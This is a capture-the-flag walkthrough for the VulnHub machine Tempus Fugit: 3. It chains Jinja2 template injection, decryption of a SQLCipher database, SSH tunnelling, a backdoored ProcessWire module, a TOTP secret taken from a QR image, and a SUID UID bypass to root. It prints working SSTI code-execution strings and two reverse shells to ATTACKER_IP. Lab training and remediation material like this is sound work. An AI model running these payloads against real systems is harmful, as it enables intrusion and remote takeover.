# Tempus Fugit: 3 — Time Flies, But Root Takes Patience

Tempus fugit — Latin for "time flies." This machine lives up to its name: every step requires precision, patience, and the willingness to look deeper than the surface. This is a Hard-rated machine with one of the most intricate attack chains on VulnHub. Jinja2 SSTI gives you code execution, an encrypted SQLCipher database hides credentials and flags, SSH tunneling exposes a second internal web app, a malicious ProcessWire module delivers a second shell, QR-code-based TOTP 2FA protects a user, a custom SUID binary with a hardcoded UID check is the final boss, and a user with UID 0xdeadbeef unlocks root. No cap, this machine is a masterpiece of complexity. Big respect to the creator. gg.

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | Tempus Fugit: 3 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tempus-fugit-3,551/ |
| **Techniques** | Jinja2 Server-Side Template Injection (SSTI), SQLCipher database decryption, Python port scanning, SSH local port forwarding, ProcessWire CMS malicious module upload, QR-code TOTP 2FA extraction, SSH lateral movement, SUID binary reverse engineering (UID hardcode bypass), user creation with specific UID |
| **CVEs** | CWE-94 (Code Injection: Jinja2 SSTI via render_template_string), CWE-321 (Hard-coded Cryptographic Key: pragma key in source), CWE-732 (Incorrect Permission Assignment: SUID binary with hardcoded UID), CWE-312 (Cleartext Storage: 2FA QR secret in backup image) |
| **APT Groups** | APT41: exploits server-side template injection in web applications as an initial access technique; threat actors have specifically targeted ProcessWire CMS instances with malicious module uploads for persistence |

---

## Attack Summary

```
netdiscover → tempusf3.vh
    |
    v
nmap → web port (Flask app), SSH
    |
    v
login panel → SSTI test: {{7*'7'}} → 7777777 (Jinja2 confirmed)
    |
    v
{{...os.popen('id').read()}} → RCE as webapp user
    |
    v
reverse shell via SSTI → bash shell
    |
    v
cat app.py → secret_key + pragma_key + Flag 1 (base64)
    |
    v
sqlcipher database.db → PRAGMA key='...' → users + Flag 2 (base64 → port 37303)
    |
    v
Python port scanner → ports 37303 (SSH) + 443 (HTTPS) internal
    |
    v
SSH tunnel → -L 37303:127.0.0.1:37303 -L 8443:127.0.0.1:443
    |
    v
ProcessWire CMS on 443 → admin:Hugh → malicious module upload → shell
    |
    v
backup PNG → QR code → TOTP secret → Google Authenticator
    |
    v
ssh myrtia@tempusf3.vh -p 37303 → TOTP code → Flag 4
    |
    v
sudo addcustomer → create UID 1337 user → su → read SSH private key
    |
    v
ssh -i id_rsa cecil@tempusf3.vh -p 37303
    |
    v
custom SUID ping binary → Ghidra: getuid() == 0xdeadbeef
    |
    v
sudo addcustomer → create UID 3735928559 user → su → ./ping deadbeef → root
    |
    v
cat /root/flag.txt → GG
```

---

## Methodology

1. Host discovery and full port scan
2. SSTI detection and Jinja2 confirmation
3. RCE via Jinja2 SSTI reverse shell
4. Source code analysis for embedded keys
5. SQLCipher database decryption for credentials and flags
6. Internal port scanning and SSH tunnel setup
7. ProcessWire CMS compromise via malicious module
8. QR-code TOTP secret extraction for user myrtia
9. Lateral movement to user cecil via found SSH private key
10. SUID binary reverse engineering and UID bypass to root

---

## Step 1 — Host Discovery and Setup

```bash
sudo netdiscover -i eth0
# Note target IP, e.g., 192.168.x.x
echo "192.168.x.x  tempusf3.vh" >> /etc/hosts
```

Full port scan:

```bash
nmap -A -p- tempusf3.vh
```

Discover the web application port and SSH port. The web app runs a Flask application.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SSTI Detection and Jinja2 Confirmation

The web application presents a login panel. The URL or a form field accepts user input that is reflected in the response. Test for Server-Side Template Injection:

**Polyglot probe:** `${{<%[%'"}}%\.`

If any portion causes an error, SSTI may be present.

**Twig vs Jinja2 detection:**

```
Input: {{7*'7'}}
Twig output: 49
Jinja2 output: 7777777
```

Enter `{{7*'7'}}` in the vulnerable field. If the response shows `7777777`, you have confirmed Jinja2 SSTI.

Confirm OS command execution:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Expected response: `uid=1000(webapp) gid=1000(webapp)`

**Real-world note:** Jinja2 SSTI (CWE-94) is caused by passing user-controlled input to `render_template_string()` instead of `render_template()`. It is a critical vulnerability because template engines have direct access to the Python runtime. APT41 has exploited SSTI vulnerabilities in Python web applications in documented intrusions against technology companies.

**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python; T1190 — Exploit Public-Facing Application

---

## Step 3 — Reverse Shell via SSTI

Start a listener:

```bash
nc -lvnp 4444
```

Deliver a reverse shell through the SSTI:

```
{{''.__class__.__mro__[1].__subclasses__()[373](['bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],stdout=-1,stderr=-1).communicate()}}
```

If subclass index 373 does not work, find the correct index:

```
{%for i in ''.__class__.__mro__[1].__subclasses__()%}{{loop.index}}:{{i.__name__}} {%endfor%}
```

Look for `Popen` and use that index.

Shell stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm; export SHELL=bash
# Ctrl+Z → stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python

---

## Step 4 — Read app.py for Secret Key, Pragma Key, and Flag 1

```bash
cat app.py
```

Look for:
- `secret_key = '<value>'` or `SECRET_KEY`
- `PRAGMA key = '<value>'` or similar
- Base64-encoded string embedded in comments or variables

Decode Flag 1:

```bash
echo "<base64_string_from_app.py>" | base64 -d
# Flag 1 revealed
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files

---

## Step 5 — Decrypt SQLCipher Database

Find the SQLCipher database:

```bash
find / -name "*.db" 2>/dev/null
```

Decrypt using the pragma key from app.py:

```bash
sqlcipher database.db
```

```sql
PRAGMA key='<pragma_key_from_app.py>';
.tables
SELECT * FROM users;
SELECT * FROM flags;
```

The users table contains credentials. A base64-encoded string in the flags table decodes to reveal a port number:

```bash
echo "<base64_flag2>" | base64 -d
# Flag 2 + port 37303
```

**Real-world note:** Embedding encryption keys directly in application source code (CWE-321) defeats the purpose of encryption. Any attacker with read access to the source recovers the plaintext. Keys must be stored in environment variables, HSMs, or dedicated secrets managers, never in code.

**MITRE ATT&CK:** T1552.001 — Credentials in Files

---

## Step 6 — Internal Port Scanning

The decoded flag reveals an internal port (37303). Scan for all internal ports using Python:

```python
import socket
for port in range(1, 65535):
    s = socket.socket()
    s.settimeout(0.1)
    if s.connect_ex(('127.0.0.1', port)) == 0:
        print(port)
    s.close()
```

Alternatively, use a faster approach:

```bash
for port in $(seq 1 65535); do
  (echo > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo $port
done
```

Discovered ports: **37303** (SSH on non-standard port) and **443** (HTTPS, internal web app).

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 7 — SSH Port Forwarding and ProcessWire CMS

Forward both internal ports to the attacker:

```bash
# Using the webapp user shell with an existing credential from the DB
ssh -L 37303:127.0.0.1:37303 -L 8443:127.0.0.1:443 <user>@tempusf3.vh -p <external_ssh_port>
```

Browse to `https://127.0.0.1:8443/` — ProcessWire CMS admin panel.

The site mentions **"Hugh Janus"** as administrator. From the SQLCipher database, the password for Hugh is known. Login:

- Username: `admin`
- Password: `Hugh` (or the value from the DB for this user)

**Malicious ProcessWire module upload:**

Download a legitimate ProcessWire module (HelloWorld example). Edit the PHP file to inject a reverse shell in the `execute()` or `else` block:

```php
else {
    system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1"');
}
```

Start a listener:

```bash
nc -lvnp 5555
```

Upload through: Modules menu, Install, Upload. Then load/trigger the module to fire the reverse shell.

**MITRE ATT&CK:** T1505.001 — Server Software Component: SQL Stored Procedures (analogous module upload for RCE); T1190 — Exploit Public-Facing Application

---

## Step 8 — Lateral Movement to User myrtia via QR-Code TOTP

From the new shell, search for backup images:

```bash
find / -name "*.png" -o -name "*.jpg" 2>/dev/null | grep -i backup
```

A PNG file contains a **QR code** encoding a TOTP (Time-based One-Time Password) secret for user `myrtia`.

Options to decode the QR:
1. Exfiltrate the image and scan with Google Lens or a QR reader
2. Use `zbarimg` on the target (if available): `zbarimg backup.png`

The decoded string is an `otpauth://` URI. Import it into Google Authenticator or any TOTP app.

```bash
ssh myrtia@tempusf3.vh -p 37303
# When prompted for 2FA, enter the current TOTP code
```

```bash
cat ~/flag4.txt
# Flag 4 captured

sudo -l
# (root) NOPASSWD: /path/to/addcustomer
```

**Real-world note:** Storing TOTP QR codes as backup images (CWE-312) is a common mistake. The QR code is the seed, equivalent to a plaintext password. Any attacker who accesses it can clone the second factor entirely.

**MITRE ATT&CK:** T1621 — Multi-Factor Authentication Request Generation; T1552 — Unsecured Credentials

---

## Step 9 — Lateral Movement to User cecil via SSH Key

Use the `addcustomer` sudo privilege to create a user with UID 1337:

```bash
sudo /path/to/addcustomer
# Follow prompts: create user with UID 1337
```

Switch to the new user:

```bash
su uid1337user
find / -uid 1337 -type f 2>/dev/null
# Finds a file accessible only to UID 1337 — contains SSH private key
cat /path/to/uid1337/file
```

Save the private key and try it against each user:

```bash
ssh -i id_rsa_found cecil@tempusf3.vh -p 37303
```

```bash
id
# uid=1001(cecil) gid=1001(cecil)
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 10 — SUID Binary Reverse Engineering and Root

Find the custom SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Locate the custom `ping` binary. Analyze it:

```bash
strings /path/to/ping
# Look for hardcoded values, function calls
```

For deeper analysis (from attacker machine with Ghidra):

```bash
# Exfiltrate the binary
scp -i id_rsa -P 37303 cecilhost:/path/to/ping ./ping
```

Ghidra reveals the key logic:

```c
if (getuid() == 0xdeadbeef) {
    system("/bin/sh");
}
```

`0xdeadbeef` in decimal is `3735928559`. Create a user with that exact UID:

```bash
# As myrtia, using sudo addcustomer:
sudo /path/to/addcustomer
# Create user with UID 3735928559
su deadbeef_user
/path/to/ping deadbeef
```

```
# id
uid=3735928559(deadbeef_user) gid=...
# After SUID execution:
whoami
root
```

```bash
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Tempus fugit indeed — but patience pays off!

**Real-world note:** SUID binaries with hardcoded UID checks are a rare but real privilege escalation vector. Custom administrative tools written by developers sometimes include overly simplistic "owner check" logic that can be bypassed by creating a user with the expected UID. Always audit custom SUID binaries with a decompiler.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: SUID; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Technique |
|---|---|---|---|
| Flag 1 | base64 encoded | app.py embedded comment | Source code analysis |
| Flag 2 | base64 encoded | SQLCipher DB flags table | DB decryption |
| Flag 3 | (varies) | ProcessWire or filesystem | Module RCE |
| Flag 4 | flag4.txt | /home/myrtia/ | TOTP SSH login |
| SSH private key | (key material) | UID 1337 restricted file | User creation bypass |
| Root flag | (varies) | /root/flag.txt | SUID UID bypass |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Jinja2 SSTI via render_template_string | SSTI is critical severity; APT41 exploits it in Python web apps | Never pass user input to render_template_string(); always use render_template() |
| 2 | Encryption key (pragma key) hardcoded in app.py | CWE-321 defeats encryption; attacker with source access recovers all data | Store all cryptographic keys in environment variables or secrets managers |
| 3 | TOTP QR code backup image accessible to shell user | The QR is the seed; anyone with access can clone 2FA | Delete or encrypt TOTP backup QR codes; use hardware tokens for critical accounts |
| 4 | ProcessWire module upload enables RCE | CMS admin panels with file upload are frequent compromise targets | Disable module uploads in production; restrict admin panel to trusted IPs |
| 5 | SUID binary with hardcoded UID check | Custom security logic in binaries is often flawed; decompilation is trivial | Avoid custom SUID binaries; use standard sudo with minimal permission grants |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application (SSTI) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Python | T1059.006 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Discovery | Discovery | System Network Connections Discovery | T1049 |
| Lateral Movement | Lateral Movement | Protocol Tunneling | T1572 |
| Persistence | Persistence | Server Software Component: Module | T1505 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Credential Access | Credential Access | Multi-Factor Authentication Bypass | T1621 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: SUID | T1548.001 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix SSTI:** use `render_template()` instead of `render_template_string()` for user-controlled input; validate and escape all template context variables
2. **Move pragma key to environment:** `os.environ.get('DB_PRAGMA_KEY')` and never commit keys to source
3. **Delete TOTP backup QR images:** store TOTP secrets only in the authenticator app; use hardware tokens where possible
4. **Restrict ProcessWire module upload:** disable in production; restrict admin panel to trusted IPs via firewall
5. **Remove custom SUID binary:** use sudo with specific, minimal permissions instead
6. **Audit all SSH configurations:** non-standard ports (37303) should be documented and monitored

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all internal services including those on non-standard ports |
| Protect | Access Control | Remove TOTP backup images; restrict CMS admin panel access |
| Protect | Data Security | No encryption keys in source code; use secrets managers |
| Detect | Anomalies and Events | Alert on SSTI probes; unusual CMS module uploads |
| Respond | Response Planning | Patch SSTI; rotate all credentials from DB; remove malicious modules |
| Recover | Recovery Planning | Rebuild compromised hosts; audit all user accounts created |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict SUID binary execution; CMS admin access controls |
| AC-6 | Least Privilege | Remove custom SUID binary; restrict addcustomer sudo |
| IA-2(1) | MFA | Properly protect TOTP secrets; do not store as recoverable files |
| SC-28 | Protection of Information at Rest | Encrypt DB with keys stored outside source code |
| SI-2 | Flaw Remediation | Fix SSTI vulnerability (high severity) |
| CM-7 | Least Functionality | Disable ProcessWire module upload in production |

### CISA KEV

Server-Side Template Injection vulnerabilities (as exploited via Jinja2) are included in CISA's guidance on web application vulnerabilities. Organizations must remediate SSTI findings immediately, as they provide direct code execution on web servers.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (fix SSTI; remove SUID binary)
- **D3-HBPI** — Harden Build Pipeline Integrity (no keys in source code)
- **D3-OAM** — Operating System Administrative Management (audit all SUID binaries; restrict sudo addcustomer)
- **D3-NTF** — Network Traffic Filtering (firewall CMS admin panel; restrict SSH port access)

---

## Final Thoughts

Tempus Fugit: 3 is one of the most technically demanding machines on VulnHub. It rewards deep enumeration, creative thinking, and the patience to work through multiple layers. The SSTI entry is elegant, the SQLCipher decryption is a great real-world analogue, the TOTP bypass is clever, and the SUID UID hardcode is a genuinely creative finale. If you complete this machine without hints, you have earned it. Time flies, but skill compounds. gg.

Thanks guys!! (❍ᴥ❍ʋ)
